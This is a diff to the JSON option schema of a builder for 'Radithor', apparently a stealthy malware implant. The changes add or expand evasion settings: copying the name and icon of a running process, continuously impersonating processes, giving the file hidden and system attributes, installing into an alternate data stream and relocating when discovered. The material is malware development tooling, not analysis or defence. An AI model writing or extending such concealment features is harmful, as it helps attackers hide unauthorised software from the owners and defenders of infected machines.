@@ -31,9 +31,6 @@
             "name": "Tracking ID",
             "info": "A custom ID/code to help you keep track of this build.",
             "type": "text"
-        },
-        {
-            "type": "separator"
         }
     ],
     "setup": [
@@ -67,7 +64,7 @@
         },
         {
             "name": "Randomize name",
-            "info": "Picks a random name from any currently running executable file. This has priority over \"Use custom name\".",
+            "info": "Picks a random name from any currently running executable file and sets Radithor's file icon to the chosen file. This has priority over \"Use custom name\".",
             "type": "checkbox"
         },
         {
@@ -82,6 +79,14 @@
             "name": "Custom alternate data stream",
             "info": "The Path of the ADS Radithor will install itself to. If this is empty, It will install to %USERPROFILE%\\AppData or %SYSTEMROOT% if it is elevated.",
             "type": "text"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Hide Radithor file",
+            "info": "Gives Radithor's file hidden and system attributes.",
+            "type": "checkbox"
         }
     ],
     "options": [
@@ -124,6 +129,17 @@
             "name": "Relocate on discovery",
             "info": "Monitors explorer's name and relocates Radithor whenever the name of the directory it is in appears in explorer's name. This will do anything if the settings for viewing hidden files is turned off and Radithor is hidden.",
             "type": "checkbox"
+        },
+        {
+            "type": "separator"
+        },
+        {
+            "name": "Constant impersonation",
+            "info": "If \"Randomize name\" is enabled, Radithor will choose a random running process and set its name and icon to impersonate that process. Radithor will also impersonate another process if the original process dies.",
+            "type": "checkbox"
+        },
+        {
+            "type": "separator"
         },
         {
             "name": "Instant panic mode",
